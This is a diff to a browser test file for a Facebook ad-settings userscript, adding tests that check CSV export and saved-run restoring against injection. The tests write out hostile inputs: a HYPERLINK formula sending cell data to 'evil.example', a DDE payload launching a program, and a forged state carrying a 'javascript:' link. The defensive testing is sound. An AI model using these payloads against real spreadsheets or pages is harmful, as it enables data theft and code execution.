@@ -202,12 +202,21 @@ test('console mode: re-running the script after each page load resumes the run',
   const page = await context.newPage();
   await page.goto('https://www.facebook.com/settings/?tab=posts');
   let loads = 0;
-  page.on('load', () => { loads++; page.evaluate(SCRIPT).catch(() => {}); }); // the user pastes the script again
+  // The user pastes the script again after each page load. On the other Facebook site the saved run
+  // arrives through window.name, so the script asks before going on: the user clicks "Resume it".
+  let asked = 0;
+  page.on('load', async () => {
+    loads++;
+    await page.evaluate(SCRIPT).catch(() => {});
+    const again = panel(page).locator('button[name="resume"]');
+    try { await again.click({ timeout: 1500 }); asked++; } catch (e) { /* it carried on by itself */ }
+  });
   await page.evaluate(SCRIPT);
   await configureAndStart(page, { level: 'moderate', tasks: ['lists', 'adsettings'] });
   const r = await report(page);
 
   assert.ok(loads >= 3, 'the run crossed www -> accountscenter -> www');
+  assert.ok(asked >= 2, 'a run handed over through window.name is never started without being asked');
   assert.equal(r.lists.status, 'changed');
   assert.equal(r.ad_social.status, 'changed');
   assert.equal(sets(events).future_posts, 'Friends');
@@ -312,7 +321,7 @@ test('progress bars, advertiser details CSV, saved log and remembered advertiser
   // Issue 2: the log as a file.
   const logFile = await saved(page, 'savelog');
   assert.match(logFile.file, /^fb-ad-disable-log-[\d-]+\.txt$/);
-  assert.match(logFile.text, /^fb-ad-disable 1\.4\.1 log\n/);
+  assert.match(logFile.text, /^fb-ad-disable 1\.5\.0 log\n/);
   assert.match(logFile.text, /Options: \{.*"saveLog":true/);
   assert.match(logFile.text, /\d\d:\d\d:\d\d   6 advertisers found, 6 to process/);
   assert.match(logFile.text, /\d\d:\d\d:\d\d Finished\.\n$/);
@@ -481,6 +490,88 @@ test('when Facebook opens no advertiser at all, the run says so and moves on', a
   assert.match(r.lists.text, /for every advertiser, however it is opened/);
   assert.equal(r.ai_summaries.status, 'changed', 'the next task still runs');
   assert.deepEqual(events.filter((e) => e.type === 'listuse' || e.type === 'decoy'), []);
+  await context.close();
+});
+
+// ---- security (issue 5) -------------------------------------------------------------------
+
+test('CSV export: advertiser text can never run as a spreadsheet formula', async () => {
+  const context = await browser.newContext();
+  await mockFacebook(context, { inject: true });
+  await fakeUserscriptApi(context);
+  const page = await context.newPage();
+  await page.goto('https://www.facebook.com/settings/');
+  const hostile = [
+    '=HYPERLINK("http://evil.example/?"&A1,"click")', // formula
+    '+cmd|\' /C calc\'!A0',                           // DDE: starts a program in old Excel
+    '-2+3', '@SUM(1+1)',
+    '   =1+1',                                        // leading spaces
+    '\t=1+1', '\r=1+1', '\n=1+1',                     // control characters in front
+    '\uff1d1+1', '\uff0b1+1', '\uff0d1+1', '\uff201',  // full-width = + - @
+    'Acme;=1+1', 'Acme\t=1+1', 'Acme\n=1+1', 'Acme\r\n=1+1', // tries to open a new cell or line
+    'Acme","=1+1',                                    // tries to close the quotes
+    'Plain, "quoted" name',
+  ];
+  const text = await page.evaluate((names) => window.__fbAdDisable._csv(
+    names.map((name) => ({ task: 'seen', name, category: name, website: name, result: 'ads hidden', error: name }))), hostile);
+
+  // Every cell is quoted, and each record is one line: nothing can open a new cell or line.
+  const lines = text.replace(/^\uFEFF/, '').trimEnd().split('\r\n');
+  assert.equal(lines.length, hostile.length + 1);
+  for (const line of lines) assert.match(line, /^"(?:[^"]|"")*"(?:,"(?:[^"]|"")*")*$/);
+
+  const rows = parseCsv(text.replace(/^\uFEFF/, ''));
+  assert.equal(rows.length, hostile.length);
+  for (const row of rows) {
+    assert.equal(Object.keys(row).length, 18, 'no value spilled into another column');
+    for (const [column, value] of Object.entries(row)) {
+      assert.doesNotMatch(value, /^\s*[=+\-@\uff1d\uff0b\uff0d\uff20]/, `${column} would run as a formula: ${JSON.stringify(value)}`);
+      assert.doesNotMatch(value, /[\u0000-\u001f]/, `${column} keeps a control character`);
+    }
+  }
+  // Neutralised, not removed: the text is still there to read.
+  assert.equal(rows[0].name, '\'=HYPERLINK("http://evil.example/?"&A1,"click")');
+  assert.equal(rows[2].name, '\'-2+3');
+  assert.equal(rows[12].name, 'Acme;=1+1');
+  assert.equal(rows[17].name, 'Plain, "quoted" name');
+  await context.close();
+});
+
+test('a saved run is checked before use: no script links, no unknown tasks, no silent start', async () => {
+  const context = await browser.newContext();
+  const events = await mockFacebook(context);
+  const page = await context.newPage();
+  const forged = (extra) => `fbAdDisableState:${JSON.stringify({
+    v: 2, running: true, navAt: Date.now(), savedAt: Date.now(), idx: 99, log: [],
+    opts: { tasks: ['seen'], level: 'default', delay: 20 },
+    results: [{ id: 'seen', title: 'Forged step', status: 'manual', detail: '', manual: 'Click here.',
+      url: 'javascript:window.__pwned=1' }, { id: 'x', title: 'Unknown status', status: 'owned', url: 'https://evil.example/' }],
+    lists: { way: 'direct', at: { key: '/x', href: 'https://evil.example/ads/audience_based_advertising/1/', name: 'x' }, all: [] },
+    ...extra,
+  })}`;
+
+  // Another site left a "run in progress" in window.name before the tab came to Facebook.
+  await page.goto('https://www.facebook.com/settings/');
+  await page.evaluate((name) => { window.name = name; }, forged({}));
+  await page.evaluate(SCRIPT);
+  await panel(page).locator('button[name="start"]').waitFor();
+  await page.waitForTimeout(500);
+  assert.deepEqual(events, [], 'nothing was started');
+  // It is offered, and what it contains is made harmless: the report's link is dropped, the unknown result too.
+  await panel(page).locator('button[name="resume"]').click();
+  await panel(page).locator('#summary').waitFor();
+  assert.equal(await panel(page).locator('li').count(), 1);
+  assert.equal(await panel(page).locator('li a').getAttribute('href'), null, 'a javascript: address never becomes a link');
+  assert.equal(await page.evaluate(() => window.__pwned), undefined);
+  await panel(page).locator('button[name="menu"]').click();
+
+  // A saved run with a task or level this script does not have is not a saved run.
+  await page.goto('https://www.facebook.com/settings/?tab=posts');
+  await page.evaluate((name) => { window.name = name; sessionStorage.clear(); }, forged({ opts: { tasks: ['seen', 'wipe'], level: 'default' } }));
+  await page.evaluate(SCRIPT);
+  await panel(page).locator('button[name="start"]').waitFor();
+  assert.equal(await panel(page).locator('button[name="resume"]').count(), 0);
+  assert.deepEqual(events, []);
   await context.close();
 });
 
